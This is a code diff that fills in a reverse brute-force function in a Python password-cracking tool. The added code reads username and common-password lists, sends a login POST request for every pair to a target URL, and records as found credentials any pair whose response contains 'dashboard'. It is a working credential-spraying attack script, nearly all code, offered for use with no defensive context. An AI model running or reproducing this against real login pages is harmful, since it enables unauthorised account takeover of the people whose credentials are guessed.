@@ -13,7 +13,6 @@ from time import time
 from string import ascii_lowercase
 from io import BytesIO
 import logging
-import requests
 import threading
 from itertools import product
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -28,7 +27,7 @@ from colorama import init
 from tqdm import tqdm
 from tabulate import tabulate
 from PIL import Image, ImageTk
-
+from requests import post
 
 
 
@@ -713,6 +712,146 @@ def dictionary_attack(file_path, file_type, dictionary_file):
 def reverse_brute_force(url, username_file, common_password_file):
     global results
     foundLogins = []
+
+    try:
+        # Initialize Variables need it for the attack
+        startTime = time()     # Record the start time
+        results = []           # Initialize the result list
+        successLogins = []     # Initialize the success logins list
+
+        # Try to Read a common passwords file with Error Handling
+        try:
+            commonPasswords = read_file_lines(common_password_file)
+            update_progress(f"[+] Common Password file '{common_password_file}' Loaded Successfully.")
+
+        except FileNotFoundError:
+            update_progress(f"[-] Common Password file '{common_password_file}' Not Found!")
+            return None
+
+        except ValueError as e:
+            update_progress(f"[-] Error while reading Common Password file: {str(e)}")
+            return None
+
+        # Try to Read a username file with Error Handling
+        try:
+            usernames = read_file_lines(username_file)
+            update_progress(f"[+] Username file '{username_file}' Loaded Successfully.")
+
+        except FileNotFoundError:
+            update_progress(f"[-] Username file '{username_file}' Not Found!")
+            return None
+
+        except ValueError as e:
+            update_progress(f"[-] Error while reading Username file: {str(e)}")
+            return None
+
+        # Initialize the attempt counter and Calculate total attempts
+        attemptCounter = 0
+        totalAttempts = len(usernames) * len(commonPasswords)
+
+        # Open a Progress Bar to Perform Reverse bruteforce synced by Progress bar
+        # Reverse Bruteforce Attack Codes write in the below 'with' Block
+        with tqdm(total=totalAttempts, desc="Reverse Brute Force Progress", unit="attempt", dynamic_ncols=True) as pbar:
+
+            # Iterate on All Password to Try with Usernames which read from the username file
+            for password in commonPasswords:
+                for username in usernames:
+
+                    # If User cancels Attack, summary_result and return None
+                    if stopFlag:
+                        update_progress("[-] Process interrupted by User.")
+                        logging.info("[-] Process interrupted by User.")
+                        summary_results()
+                        return None
+
+                    # If a user flag doesn't set, start the Attack Process.
+                    # First, Increment the attempt counter
+                    attemptCounter += 1
+
+                    # TODO: Add Some Payload Data format, to send basically on the target server, for example:
+                    #               firs check targets payload with condition, and then fill payload like
+                    #               {'user': username, 'pass': password}
+                    #Send login POST request with read username and the password as Payload Data
+                    response = post(url, data={'username': username, 'password': password})
+
+
+                    # TODO: Add Some Conditions for Success Login Checking for example:
+                    #               Check if the response is successful (status code 200),
+                    #               Check 'success' in response.json() or Check 'success' in response.text()
+
+                    # If 'Dashboard' in response.text Mean password founded
+                    if 'dashboard' in response.text:
+                        endTime = time() # record the end time
+
+                        # Append successful attempt to results
+                        results.append([attemptCounter, username, password, "Success", endTime - startTime])
+
+                        # Append successful login to success_logins
+                        successLogins.append((username, password, attemptCounter, endTime - startTime))
+
+                        # Append found login to found_logins
+                        foundLogins.append([attemptCounter, username, password, endTime - startTime])
+
+                        # Create tabulate table for found logins
+                        table = tabulate(foundLogins,
+                                         headers=["Attempt", "Username", "Password", "Time Taken"], tablefmt="grid")
+
+                        # Update the Result Log Section and Log Section with Founded Table
+                        update_log(f"\nFounded Logins:\n{table}")
+                        update_result_log(f"Password found: {password} for username: {username}\nTime taken: "
+                                          f"{endTime - startTime} seconds\nAttempts made: {attemptCounter}", success=True)
+
+                        # Submit Logs for Password founded, Time Taken and Attempts made
+                        logging.info(f"[+] Password found: {password} for username: {username}")
+                        logging.info(f"[+] Time taken: {endTime - startTime} seconds")
+                        logging.info(f"[+] Attempts made: {attemptCounter}")
+
+                    # Else, append unsuccessful attempt to results
+                    else:
+                        results.append([attemptCounter, username, password,"Unsuccessful"])
+
+                    # Update the progress bar
+                    pbar.update(1)
+
+                    # Create Table from last 100 items of results
+                    table = tabulate(results[-100:],
+                                     headers=["Attempt", "Username", "Password", "Status"], tablefmt="grid")
+
+                    # Update Log Section with Table
+                    update_log(table)
+
+                    # Update Progress Bar synced by Try Attempts then update idletask
+                    update_progress_bar(attemptCounter, totalAttempts, startTime)
+                    root.update_idletasks()
+
+        # if Correct Username/Password(account) found
+        if successLogins:
+
+            # Create a table for success logins
+            summaryTable = tabulate(successLogins,
+                                     headers=["Username", "Password", "Attempts", "Time Taken"], tablefmt="grid")
+            # Update result log and Submit Info Log from summary_table
+            update_result_log(f"\nSummary of found logins:\n{summaryTable}")
+            logging.info(f"[+] Summary of found logins:\n{summaryTable}")
+
+        # Else, Mean not found any account
+        else:
+            # Update result log and Submit Info Log for Password/Username Not founded
+            update_result_log("[-] Password not found for any username.")
+            logging.info("[-] Password not found for any username.")
+
+        # Update Progress bar synced by Attempts
+        update_progress_bar(totalAttempts, totalAttempts, startTime)
+
+
+    # If user pressed CTRL+C, Submit Interrupt Progress and Logs then summary results
+    except KeyboardInterrupt:
+        update_progress("[-] Process interrupted by User.")
+        logging.info("[-] Process interrupted by User.")
+        summary_results()
+
+    return None
+
 
 
 
